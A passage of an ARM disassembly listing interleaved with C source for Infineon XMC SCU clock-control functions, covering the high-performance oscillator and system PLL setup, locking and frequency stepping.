                             (SCU_HIBERNATE_OSCULCTRL_MODE_OSC_POWER_DOWN << SCU_HIBERNATE_OSCULCTRL_MODE_Pos);                       
}
 8002194:	bf00      	nop
 8002196:	46bd      	mov	sp, r7
 8002198:	f85d 7b04 	ldr.w	r7, [sp], #4
 800219c:	4770      	bx	lr
 800219e:	bf00      	nop
 80021a0:	50004000 	.word	0x50004000
 80021a4:	50004300 	.word	0x50004300

080021a8 <XMC_SCU_CLOCK_GetLowPowerOscillatorGeneralPurposeInputStatus>:

uint32_t XMC_SCU_CLOCK_GetLowPowerOscillatorGeneralPurposeInputStatus(void)
{
 80021a8:	b480      	push	{r7}
 80021aa:	af00      	add	r7, sp, #0
  return (SCU_HIBERNATE->OSCULSTAT & SCU_HIBERNATE_OSCULSTAT_X1D_Msk);
 80021ac:	4b04      	ldr	r3, [pc, #16]	; (80021c0 <XMC_SCU_CLOCK_GetLowPowerOscillatorGeneralPurposeInputStatus+0x18>)
 80021ae:	699b      	ldr	r3, [r3, #24]
 80021b0:	f003 0301 	and.w	r3, r3, #1
}
 80021b4:	4618      	mov	r0, r3
 80021b6:	46bd      	mov	sp, r7
 80021b8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80021bc:	4770      	bx	lr
 80021be:	bf00      	nop
 80021c0:	50004300 	.word	0x50004300

080021c4 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator>:

/* API to enable High Precision High Speed oscillator */
void XMC_SCU_CLOCK_EnableHighPerformanceOscillator(void)
{
 80021c4:	b598      	push	{r3, r4, r7, lr}
 80021c6:	af00      	add	r7, sp, #0
  SCU_PLL->PLLCON0 &= (uint32_t)~SCU_PLL_PLLCON0_PLLPWD_Msk;
 80021c8:	4b0f      	ldr	r3, [pc, #60]	; (8002208 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x44>)
 80021ca:	685b      	ldr	r3, [r3, #4]
 80021cc:	4a0e      	ldr	r2, [pc, #56]	; (8002208 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x44>)
 80021ce:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80021d2:	6053      	str	r3, [r2, #4]

  SCU_OSC->OSCHPCTRL = (uint32_t)((SCU_OSC->OSCHPCTRL & ~(SCU_OSC_OSCHPCTRL_MODE_Msk | SCU_OSC_OSCHPCTRL_OSCVAL_Msk)) |
 80021d4:	4b0d      	ldr	r3, [pc, #52]	; (800220c <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x48>)
 80021d6:	685b      	ldr	r3, [r3, #4]
 80021d8:	f423 2470 	bic.w	r4, r3, #983040	; 0xf0000
 80021dc:	f024 0430 	bic.w	r4, r4, #48	; 0x30
                                  (((OSCHP_GetFrequency() / FOSCREF) - 1UL) << SCU_OSC_OSCHPCTRL_OSCVAL_Pos));
 80021e0:	f004 fa02 	bl	80065e8 <OSCHP_GetFrequency>
 80021e4:	4603      	mov	r3, r0
 80021e6:	4a0a      	ldr	r2, [pc, #40]	; (8002210 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x4c>)
 80021e8:	fba2 2303 	umull	r2, r3, r2, r3
 80021ec:	0d1b      	lsrs	r3, r3, #20
 80021ee:	3b01      	subs	r3, #1
 80021f0:	041b      	lsls	r3, r3, #16
  SCU_OSC->OSCHPCTRL = (uint32_t)((SCU_OSC->OSCHPCTRL & ~(SCU_OSC_OSCHPCTRL_MODE_Msk | SCU_OSC_OSCHPCTRL_OSCVAL_Msk)) |
 80021f2:	4a06      	ldr	r2, [pc, #24]	; (800220c <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x48>)
 80021f4:	4323      	orrs	r3, r4
 80021f6:	6053      	str	r3, [r2, #4]

  /* restart OSC Watchdog */
  SCU_PLL->PLLCON0 &= (uint32_t)~SCU_PLL_PLLCON0_OSCRES_Msk;
 80021f8:	4b03      	ldr	r3, [pc, #12]	; (8002208 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x44>)
 80021fa:	685b      	ldr	r3, [r3, #4]
 80021fc:	4a02      	ldr	r2, [pc, #8]	; (8002208 <XMC_SCU_CLOCK_EnableHighPerformanceOscillator+0x44>)
 80021fe:	f423 3300 	bic.w	r3, r3, #131072	; 0x20000
 8002202:	6053      	str	r3, [r2, #4]
}
 8002204:	bf00      	nop
 8002206:	bd98      	pop	{r3, r4, r7, pc}
 8002208:	50004710 	.word	0x50004710
 800220c:	50004700 	.word	0x50004700
 8002210:	6b5fca6b 	.word	0x6b5fca6b

08002214 <XMC_SCU_CLOCK_IsHighPerformanceOscillatorStable>:

bool XMC_SCU_CLOCK_IsHighPerformanceOscillatorStable(void)
{
 8002214:	b480      	push	{r7}
 8002216:	af00      	add	r7, sp, #0
  return ((SCU_PLL->PLLSTAT & XMC_SCU_PLL_PLLSTAT_OSC_USABLE) == XMC_SCU_PLL_PLLSTAT_OSC_USABLE);
 8002218:	4b07      	ldr	r3, [pc, #28]	; (8002238 <XMC_SCU_CLOCK_IsHighPerformanceOscillatorStable+0x24>)
 800221a:	681b      	ldr	r3, [r3, #0]
 800221c:	f403 7360 	and.w	r3, r3, #896	; 0x380
 8002220:	f5b3 7f60 	cmp.w	r3, #896	; 0x380
 8002224:	bf0c      	ite	eq
 8002226:	2301      	moveq	r3, #1
 8002228:	2300      	movne	r3, #0
 800222a:	b2db      	uxtb	r3, r3
}
 800222c:	4618      	mov	r0, r3
 800222e:	46bd      	mov	sp, r7
 8002230:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002234:	4770      	bx	lr
 8002236:	bf00      	nop
 8002238:	50004710 	.word	0x50004710

0800223c <XMC_SCU_CLOCK_DisableHighPerformanceOscillator>:

/* API to disable High Precision High Speed oscillator */
void XMC_SCU_CLOCK_DisableHighPerformanceOscillator(void)
{
 800223c:	b480      	push	{r7}
 800223e:	af00      	add	r7, sp, #0
  SCU_OSC->OSCHPCTRL |= (uint32_t)SCU_OSC_OSCHPCTRL_MODE_Msk;
 8002240:	4b05      	ldr	r3, [pc, #20]	; (8002258 <XMC_SCU_CLOCK_DisableHighPerformanceOscillator+0x1c>)
 8002242:	685b      	ldr	r3, [r3, #4]
 8002244:	4a04      	ldr	r2, [pc, #16]	; (8002258 <XMC_SCU_CLOCK_DisableHighPerformanceOscillator+0x1c>)
 8002246:	f043 0330 	orr.w	r3, r3, #48	; 0x30
 800224a:	6053      	str	r3, [r2, #4]
}
 800224c:	bf00      	nop
 800224e:	46bd      	mov	sp, r7
 8002250:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002254:	4770      	bx	lr
 8002256:	bf00      	nop
 8002258:	50004700 	.word	0x50004700

0800225c <XMC_SCU_CLOCK_EnableHighPerformanceOscillatorGeneralPurposeInput>:

void XMC_SCU_CLOCK_EnableHighPerformanceOscillatorGeneralPurposeInput(void)
{
 800225c:	b480      	push	{r7}
 800225e:	af00      	add	r7, sp, #0
  SCU_OSC->OSCHPCTRL |= SCU_OSC_OSCHPCTRL_X1DEN_Msk;
 8002260:	4b05      	ldr	r3, [pc, #20]	; (8002278 <XMC_SCU_CLOCK_EnableHighPerformanceOscillatorGeneralPurposeInput+0x1c>)
 8002262:	685b      	ldr	r3, [r3, #4]
 8002264:	4a04      	ldr	r2, [pc, #16]	; (8002278 <XMC_SCU_CLOCK_EnableHighPerformanceOscillatorGeneralPurposeInput+0x1c>)
 8002266:	f043 0301 	orr.w	r3, r3, #1
 800226a:	6053      	str	r3, [r2, #4]
}
 800226c:	bf00      	nop
 800226e:	46bd      	mov	sp, r7
 8002270:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002274:	4770      	bx	lr
 8002276:	bf00      	nop
 8002278:	50004700 	.word	0x50004700

0800227c <XMC_SCU_CLOCK_DisableHighPerformanceOscillatorGeneralPurposeInput>:

void XMC_SCU_CLOCK_DisableHighPerformanceOscillatorGeneralPurposeInput(void)
{
 800227c:	b480      	push	{r7}
 800227e:	af00      	add	r7, sp, #0
  SCU_OSC->OSCHPCTRL &= ~SCU_OSC_OSCHPCTRL_X1DEN_Msk;
 8002280:	4b05      	ldr	r3, [pc, #20]	; (8002298 <XMC_SCU_CLOCK_DisableHighPerformanceOscillatorGeneralPurposeInput+0x1c>)
 8002282:	685b      	ldr	r3, [r3, #4]
 8002284:	4a04      	ldr	r2, [pc, #16]	; (8002298 <XMC_SCU_CLOCK_DisableHighPerformanceOscillatorGeneralPurposeInput+0x1c>)
 8002286:	f023 0301 	bic.w	r3, r3, #1
 800228a:	6053      	str	r3, [r2, #4]
}
 800228c:	bf00      	nop
 800228e:	46bd      	mov	sp, r7
 8002290:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002294:	4770      	bx	lr
 8002296:	bf00      	nop
 8002298:	50004700 	.word	0x50004700

0800229c <XMC_SCU_CLOCK_GetHighPerformanceOscillatorGeneralPurposeInputStatus>:

uint32_t XMC_SCU_CLOCK_GetHighPerformanceOscillatorGeneralPurposeInputStatus(void)
{
 800229c:	b480      	push	{r7}
 800229e:	af00      	add	r7, sp, #0
  return (SCU_OSC->OSCHPSTAT & SCU_OSC_OSCHPSTAT_X1D_Msk);
 80022a0:	4b04      	ldr	r3, [pc, #16]	; (80022b4 <XMC_SCU_CLOCK_GetHighPerformanceOscillatorGeneralPurposeInputStatus+0x18>)
 80022a2:	681b      	ldr	r3, [r3, #0]
 80022a4:	f003 0301 	and.w	r3, r3, #1
}
 80022a8:	4618      	mov	r0, r3
 80022aa:	46bd      	mov	sp, r7
 80022ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022b0:	4770      	bx	lr
 80022b2:	bf00      	nop
 80022b4:	50004700 	.word	0x50004700

080022b8 <XMC_SCU_CLOCK_EnableSystemPll>:

/* API to enable main PLL */
void XMC_SCU_CLOCK_EnableSystemPll(void)
{
 80022b8:	b480      	push	{r7}
 80022ba:	af00      	add	r7, sp, #0
  SCU_PLL->PLLCON0 &= (uint32_t)~(SCU_PLL_PLLCON0_VCOPWD_Msk | SCU_PLL_PLLCON0_PLLPWD_Msk);
 80022bc:	4b06      	ldr	r3, [pc, #24]	; (80022d8 <XMC_SCU_CLOCK_EnableSystemPll+0x20>)
 80022be:	685b      	ldr	r3, [r3, #4]
 80022c0:	4a05      	ldr	r2, [pc, #20]	; (80022d8 <XMC_SCU_CLOCK_EnableSystemPll+0x20>)
 80022c2:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80022c6:	f023 0302 	bic.w	r3, r3, #2
 80022ca:	6053      	str	r3, [r2, #4]
}
 80022cc:	bf00      	nop
 80022ce:	46bd      	mov	sp, r7
 80022d0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022d4:	4770      	bx	lr
 80022d6:	bf00      	nop
 80022d8:	50004710 	.word	0x50004710

080022dc <XMC_SCU_CLOCK_DisableSystemPll>:

/* API to disable main PLL */
void XMC_SCU_CLOCK_DisableSystemPll(void)
{
 80022dc:	b480      	push	{r7}
 80022de:	af00      	add	r7, sp, #0
  SCU_PLL->PLLCON0 |= (uint32_t)(SCU_PLL_PLLCON0_VCOPWD_Msk | SCU_PLL_PLLCON0_PLLPWD_Msk);
 80022e0:	4b06      	ldr	r3, [pc, #24]	; (80022fc <XMC_SCU_CLOCK_DisableSystemPll+0x20>)
 80022e2:	685b      	ldr	r3, [r3, #4]
 80022e4:	4a05      	ldr	r2, [pc, #20]	; (80022fc <XMC_SCU_CLOCK_DisableSystemPll+0x20>)
 80022e6:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80022ea:	f043 0302 	orr.w	r3, r3, #2
 80022ee:	6053      	str	r3, [r2, #4]
}
 80022f0:	bf00      	nop
 80022f2:	46bd      	mov	sp, r7
 80022f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80022f8:	4770      	bx	lr
 80022fa:	bf00      	nop
 80022fc:	50004710 	.word	0x50004710

08002300 <XMC_SCU_CLOCK_StartSystemPll>:
void XMC_SCU_CLOCK_StartSystemPll(XMC_SCU_CLOCK_SYSPLLCLKSRC_t source,
                                  XMC_SCU_CLOCK_SYSPLL_MODE_t mode,
                                  uint32_t pdiv,
                                  uint32_t ndiv,
                                  uint32_t kdiv)
{
 8002300:	b580      	push	{r7, lr}
 8002302:	b086      	sub	sp, #24
 8002304:	af00      	add	r7, sp, #0
 8002306:	60ba      	str	r2, [r7, #8]
 8002308:	607b      	str	r3, [r7, #4]
 800230a:	4603      	mov	r3, r0
 800230c:	81fb      	strh	r3, [r7, #14]
 800230e:	460b      	mov	r3, r1
 8002310:	737b      	strb	r3, [r7, #13]

  uint32_t vco_frequency; /* Q10.22, max VCO frequency = 520MHz */
  uint32_t kdiv_temp;

  XMC_SCU_CLOCK_SetSystemPllClockSource(source);
 8002312:	89fb      	ldrh	r3, [r7, #14]
 8002314:	4618      	mov	r0, r3
 8002316:	f7ff fa85 	bl	8001824 <XMC_SCU_CLOCK_SetSystemPllClockSource>

  if (mode == XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL)
 800231a:	7b7b      	ldrb	r3, [r7, #13]
 800231c:	2b01      	cmp	r3, #1
 800231e:	f040 8084 	bne.w	800242a <XMC_SCU_CLOCK_StartSystemPll+0x12a>
  {
    /* Calculate initial step to be close to fOFI */
    if (source == XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP)
 8002322:	89fb      	ldrh	r3, [r7, #14]
 8002324:	2b00      	cmp	r3, #0
 8002326:	d109      	bne.n	800233c <XMC_SCU_CLOCK_StartSystemPll+0x3c>
    {
      vco_frequency = (OSCHP_GetFrequency() / 1000000U) << 22;
 8002328:	f004 f95e 	bl	80065e8 <OSCHP_GetFrequency>
 800232c:	4603      	mov	r3, r0
 800232e:	4a4c      	ldr	r2, [pc, #304]	; (8002460 <XMC_SCU_CLOCK_StartSystemPll+0x160>)
 8002330:	fba2 2303 	umull	r2, r3, r2, r3
 8002334:	0c9b      	lsrs	r3, r3, #18
 8002336:	059b      	lsls	r3, r3, #22
 8002338:	617b      	str	r3, [r7, #20]
 800233a:	e002      	b.n	8002342 <XMC_SCU_CLOCK_StartSystemPll+0x42>
    }
    else
    {
      vco_frequency = (OFI_FREQUENCY / 1000000U) << 22;
 800233c:	f04f 63c0 	mov.w	r3, #100663296	; 0x6000000
 8002340:	617b      	str	r3, [r7, #20]
    }
    vco_frequency = ((vco_frequency * ndiv) / pdiv);
 8002342:	697b      	ldr	r3, [r7, #20]
 8002344:	687a      	ldr	r2, [r7, #4]
 8002346:	fb03 f202 	mul.w	r2, r3, r2
 800234a:	68bb      	ldr	r3, [r7, #8]
 800234c:	fbb2 f3f3 	udiv	r3, r2, r3
 8002350:	617b      	str	r3, [r7, #20]
    kdiv_temp = (vco_frequency / (OFI_FREQUENCY / 1000000U)) >> 22;
 8002352:	697b      	ldr	r3, [r7, #20]
 8002354:	4a43      	ldr	r2, [pc, #268]	; (8002464 <XMC_SCU_CLOCK_StartSystemPll+0x164>)
 8002356:	fba2 2303 	umull	r2, r3, r2, r3
 800235a:	091b      	lsrs	r3, r3, #4
 800235c:	0d9b      	lsrs	r3, r3, #22
 800235e:	613b      	str	r3, [r7, #16]

    /* Switch to prescaler mode */
    SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_VCOBYP_Msk;
 8002360:	4b41      	ldr	r3, [pc, #260]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 8002362:	685b      	ldr	r3, [r3, #4]
 8002364:	4a40      	ldr	r2, [pc, #256]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 8002366:	f043 0301 	orr.w	r3, r3, #1
 800236a:	6053      	str	r3, [r2, #4]

    /* disconnect Oscillator from PLL */
    SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_FINDIS_Msk;
 800236c:	4b3e      	ldr	r3, [pc, #248]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 800236e:	685b      	ldr	r3, [r3, #4]
 8002370:	4a3d      	ldr	r2, [pc, #244]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 8002372:	f043 0310 	orr.w	r3, r3, #16
 8002376:	6053      	str	r3, [r2, #4]

    /* Setup divider settings for main PLL */
    SCU_PLL->PLLCON1 = (uint32_t)((SCU_PLL->PLLCON1 & ~(SCU_PLL_PLLCON1_NDIV_Msk | SCU_PLL_PLLCON1_K2DIV_Msk |
 8002378:	4b3b      	ldr	r3, [pc, #236]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 800237a:	689a      	ldr	r2, [r3, #8]
 800237c:	4b3b      	ldr	r3, [pc, #236]	; (800246c <XMC_SCU_CLOCK_StartSystemPll+0x16c>)
 800237e:	4013      	ands	r3, r2
                                   SCU_PLL_PLLCON1_PDIV_Msk)) | ((ndiv - 1UL) << SCU_PLL_PLLCON1_NDIV_Pos) |
 8002380:	687a      	ldr	r2, [r7, #4]
 8002382:	3a01      	subs	r2, #1
 8002384:	0212      	lsls	r2, r2, #8
 8002386:	431a      	orrs	r2, r3
                                   ((kdiv_temp - 1UL) << SCU_PLL_PLLCON1_K2DIV_Pos) |
 8002388:	693b      	ldr	r3, [r7, #16]
 800238a:	3b01      	subs	r3, #1
 800238c:	041b      	lsls	r3, r3, #16
                                   SCU_PLL_PLLCON1_PDIV_Msk)) | ((ndiv - 1UL) << SCU_PLL_PLLCON1_NDIV_Pos) |
 800238e:	431a      	orrs	r2, r3
                                   ((pdiv - 1UL)<< SCU_PLL_PLLCON1_PDIV_Pos));
 8002390:	68bb      	ldr	r3, [r7, #8]
 8002392:	3b01      	subs	r3, #1
 8002394:	061b      	lsls	r3, r3, #24
    SCU_PLL->PLLCON1 = (uint32_t)((SCU_PLL->PLLCON1 & ~(SCU_PLL_PLLCON1_NDIV_Msk | SCU_PLL_PLLCON1_K2DIV_Msk |
 8002396:	4934      	ldr	r1, [pc, #208]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 8002398:	4313      	orrs	r3, r2
 800239a:	608b      	str	r3, [r1, #8]

    /* Set OSCDISCDIS, OSC clock remains connected to the VCO in case of loss of lock */
    SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_OSCDISCDIS_Msk;
 800239c:	4b32      	ldr	r3, [pc, #200]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 800239e:	685b      	ldr	r3, [r3, #4]
 80023a0:	4a31      	ldr	r2, [pc, #196]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023a2:	f043 0340 	orr.w	r3, r3, #64	; 0x40
 80023a6:	6053      	str	r3, [r2, #4]

    /* connect Oscillator to PLL */
    SCU_PLL->PLLCON0 &= (uint32_t)~SCU_PLL_PLLCON0_FINDIS_Msk;
 80023a8:	4b2f      	ldr	r3, [pc, #188]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023aa:	685b      	ldr	r3, [r3, #4]
 80023ac:	4a2e      	ldr	r2, [pc, #184]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023ae:	f023 0310 	bic.w	r3, r3, #16
 80023b2:	6053      	str	r3, [r2, #4]

    /* restart PLL Lock detection */
    SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_RESLD_Msk;
 80023b4:	4b2c      	ldr	r3, [pc, #176]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023b6:	685b      	ldr	r3, [r3, #4]
 80023b8:	4a2b      	ldr	r2, [pc, #172]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023ba:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 80023be:	6053      	str	r3, [r2, #4]
    while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk) == 0U)
 80023c0:	bf00      	nop
 80023c2:	4b29      	ldr	r3, [pc, #164]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023c4:	681b      	ldr	r3, [r3, #0]
 80023c6:	f003 0304 	and.w	r3, r3, #4
 80023ca:	2b00      	cmp	r3, #0
 80023cc:	d0f9      	beq.n	80023c2 <XMC_SCU_CLOCK_StartSystemPll+0xc2>
    {
      /* wait for PLL Lock */
    }

    /* Switch to normal mode */
    SCU_PLL->PLLCON0 &= (uint32_t)~SCU_PLL_PLLCON0_VCOBYP_Msk;
 80023ce:	4b26      	ldr	r3, [pc, #152]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023d0:	685b      	ldr	r3, [r3, #4]
 80023d2:	4a25      	ldr	r2, [pc, #148]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023d4:	f023 0301 	bic.w	r3, r3, #1
 80023d8:	6053      	str	r3, [r2, #4]
    while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOBYST_Msk) != 0U)
 80023da:	bf00      	nop
 80023dc:	4b22      	ldr	r3, [pc, #136]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 80023de:	681b      	ldr	r3, [r3, #0]
 80023e0:	f003 0301 	and.w	r3, r3, #1
 80023e4:	2b00      	cmp	r3, #0
 80023e6:	d1f9      	bne.n	80023dc <XMC_SCU_CLOCK_StartSystemPll+0xdc>
    {
      /* wait for normal mode */
    }

    /* Ramp up PLL frequency in steps */
    kdiv_temp = (vco_frequency / 60UL) >> 22;
 80023e8:	697b      	ldr	r3, [r7, #20]
 80023ea:	4a21      	ldr	r2, [pc, #132]	; (8002470 <XMC_SCU_CLOCK_StartSystemPll+0x170>)
 80023ec:	fba2 2303 	umull	r2, r3, r2, r3
 80023f0:	095b      	lsrs	r3, r3, #5
 80023f2:	0d9b      	lsrs	r3, r3, #22
 80023f4:	613b      	str	r3, [r7, #16]
    if (kdiv < kdiv_temp)
 80023f6:	6a3a      	ldr	r2, [r7, #32]
 80023f8:	693b      	ldr	r3, [r7, #16]
 80023fa:	429a      	cmp	r2, r3
 80023fc:	d202      	bcs.n	8002404 <XMC_SCU_CLOCK_StartSystemPll+0x104>
    {
      XMC_SCU_CLOCK_StepSystemPllFrequency(kdiv_temp);
 80023fe:	6938      	ldr	r0, [r7, #16]
 8002400:	f000 f84a 	bl	8002498 <XMC_SCU_CLOCK_StepSystemPllFrequency>
    }

    kdiv_temp = (vco_frequency / 90UL) >> 22;
 8002404:	697b      	ldr	r3, [r7, #20]
 8002406:	085b      	lsrs	r3, r3, #1
 8002408:	4a1a      	ldr	r2, [pc, #104]	; (8002474 <XMC_SCU_CLOCK_StartSystemPll+0x174>)
 800240a:	fba2 2303 	umull	r2, r3, r2, r3
 800240e:	095b      	lsrs	r3, r3, #5
 8002410:	0d9b      	lsrs	r3, r3, #22
 8002412:	613b      	str	r3, [r7, #16]
    if (kdiv < kdiv_temp)
 8002414:	6a3a      	ldr	r2, [r7, #32]
 8002416:	693b      	ldr	r3, [r7, #16]
 8002418:	429a      	cmp	r2, r3
 800241a:	d202      	bcs.n	8002422 <XMC_SCU_CLOCK_StartSystemPll+0x122>
    {
      XMC_SCU_CLOCK_StepSystemPllFrequency(kdiv_temp);
 800241c:	6938      	ldr	r0, [r7, #16]
 800241e:	f000 f83b 	bl	8002498 <XMC_SCU_CLOCK_StepSystemPllFrequency>
    }

    XMC_SCU_CLOCK_StepSystemPllFrequency(kdiv);
 8002422:	6a38      	ldr	r0, [r7, #32]
 8002424:	f000 f838 	bl	8002498 <XMC_SCU_CLOCK_StepSystemPllFrequency>
    while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOBYST_Msk) == 0U)
    {
      /* wait for prescaler mode */
    }
  }
}
 8002428:	e015      	b.n	8002456 <XMC_SCU_CLOCK_StartSystemPll+0x156>
    SCU_PLL->PLLCON1 = (uint32_t)((SCU_PLL->PLLCON1 & ~SCU_PLL_PLLCON1_K1DIV_Msk) |
 800242a:	4b0f      	ldr	r3, [pc, #60]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 800242c:	689b      	ldr	r3, [r3, #8]
 800242e:	f023 027f 	bic.w	r2, r3, #127	; 0x7f
                       ((kdiv -1UL) << SCU_PLL_PLLCON1_K1DIV_Pos));
 8002432:	6a3b      	ldr	r3, [r7, #32]
 8002434:	3b01      	subs	r3, #1
    SCU_PLL->PLLCON1 = (uint32_t)((SCU_PLL->PLLCON1 & ~SCU_PLL_PLLCON1_K1DIV_Msk) |
 8002436:	490c      	ldr	r1, [pc, #48]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 8002438:	4313      	orrs	r3, r2
 800243a:	608b      	str	r3, [r1, #8]
    SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_VCOBYP_Msk;
 800243c:	4b0a      	ldr	r3, [pc, #40]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 800243e:	685b      	ldr	r3, [r3, #4]
 8002440:	4a09      	ldr	r2, [pc, #36]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 8002442:	f043 0301 	orr.w	r3, r3, #1
 8002446:	6053      	str	r3, [r2, #4]
    while ((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOBYST_Msk) == 0U)
 8002448:	bf00      	nop
 800244a:	4b07      	ldr	r3, [pc, #28]	; (8002468 <XMC_SCU_CLOCK_StartSystemPll+0x168>)
 800244c:	681b      	ldr	r3, [r3, #0]
 800244e:	f003 0301 	and.w	r3, r3, #1
 8002452:	2b00      	cmp	r3, #0
 8002454:	d0f9      	beq.n	800244a <XMC_SCU_CLOCK_StartSystemPll+0x14a>
}
 8002456:	bf00      	nop
 8002458:	3718      	adds	r7, #24
 800245a:	46bd      	mov	sp, r7
 800245c:	bd80      	pop	{r7, pc}
 800245e:	bf00      	nop
 8002460:	431bde83 	.word	0x431bde83
 8002464:	aaaaaaab 	.word	0xaaaaaaab
 8002468:	50004710 	.word	0x50004710
 800246c:	f08080ff 	.word	0xf08080ff
 8002470:	88888889 	.word	0x88888889
 8002474:	b60b60b7 	.word	0xb60b60b7

08002478 <XMC_SCU_CLOCK_StopSystemPll>:

/* API to stop main PLL operation */
void XMC_SCU_CLOCK_StopSystemPll(void)
{
 8002478:	b480      	push	{r7}
 800247a:	af00      	add	r7, sp, #0
  SCU_PLL->PLLCON0 |= (uint32_t)SCU_PLL_PLLCON0_PLLPWD_Msk;
 800247c:	4b05      	ldr	r3, [pc, #20]	; (8002494 <XMC_SCU_CLOCK_StopSystemPll+0x1c>)
 800247e:	685b      	ldr	r3, [r3, #4]
 8002480:	4a04      	ldr	r2, [pc, #16]	; (8002494 <XMC_SCU_CLOCK_StopSystemPll+0x1c>)
 8002482:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8002486:	6053      	str	r3, [r2, #4]
}
 8002488:	bf00      	nop
 800248a:	46bd      	mov	sp, r7
 800248c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8002490:	4770      	bx	lr
 8002492:	bf00      	nop
 8002494:	50004710 	.word	0x50004710

08002498 <XMC_SCU_CLOCK_StepSystemPllFrequency>:

/* API to step up/down the main PLL frequency */
void XMC_SCU_CLOCK_StepSystemPllFrequency(uint32_t kdiv)
{
 8002498:	b580      	push	{r7, lr}
 800249a:	b082      	sub	sp, #8
 800249c:	af00      	add	r7, sp, #0
 800249e:	6078      	str	r0, [r7, #4]
  SCU_PLL->PLLCON1 = (uint32_t)((SCU_PLL->PLLCON1 & ~SCU_PLL_PLLCON1_K2DIV_Msk) |
 80024a0:	4b08      	ldr	r3, [pc, #32]	; (80024c4 <XMC_SCU_CLOCK_StepSystemPllFrequency+0x2c>)
 80024a2:	689b      	ldr	r3, [r3, #8]
 80024a4:	f423 02fe 	bic.w	r2, r3, #8323072	; 0x7f0000
                     ((kdiv - 1UL) << SCU_PLL_PLLCON1_K2DIV_Pos));
 80024a8:	687b      	ldr	r3, [r7, #4]
 80024aa:	3b01      	subs	r3, #1
 80024ac:	041b      	lsls	r3, r3, #16
  SCU_PLL->PLLCON1 = (uint32_t)((SCU_PLL->PLLCON1 & ~SCU_PLL_PLLCON1_K2DIV_Msk) |
 80024ae:	4905      	ldr	r1, [pc, #20]	; (80024c4 <XMC_SCU_CLOCK_StepSystemPllFrequency+0x2c>)
 80024b0:	4313      	orrs	r3, r2
 80024b2:	608b      	str	r3, [r1, #8]

  XMC_SCU_lDelay(50U);
 80024b4:	2032      	movs	r0, #50	; 0x32
 80024b6:	f7fe fc6f 	bl	8000d98 <XMC_SCU_lDelay>
}
 80024ba:	bf00      	nop
 80024bc:	3708      	adds	r7, #8
 80024be:	46bd      	mov	sp, r7
 80024c0:	bd80      	pop	{r7, pc}
 80024c2:	bf00      	nop
 80024c4:	50004710 	.word	0x50004710

080024c8 <XMC_SCU_CLOCK_IsSystemPllLocked>:

/* API to check main PLL is locked or not */
bool XMC_SCU_CLOCK_IsSystemPllLocked(void)
{
 80024c8:	b480      	push	{r7}
 80024ca:	af00      	add	r7, sp, #0
  return (bool)((SCU_PLL->PLLSTAT & SCU_PLL_PLLSTAT_VCOLOCK_Msk) != 0UL);
 80024cc:	4b06      	ldr	r3, [pc, #24]	; (80024e8 <XMC_SCU_CLOCK_IsSystemPllLocked+0x20>)
 80024ce:	681b      	ldr	r3, [r3, #0]
 80024d0:	f003 0304 	and.w	r3, r3, #4
 80024d4:	2b00      	cmp	r3, #0
 80024d6:	bf14      	ite	ne
 80024d8:	2301      	movne	r3, #1
 80024da:	2300      	moveq	r3, #0
 80024dc:	b2db      	uxtb	r3, r3
}
 80024de:	4618      	mov	r0, r3
 80024e0:	46bd      	mov	sp, r7
 80024e2:	f85d 7b04 	ldr.w	r7, [sp], #4
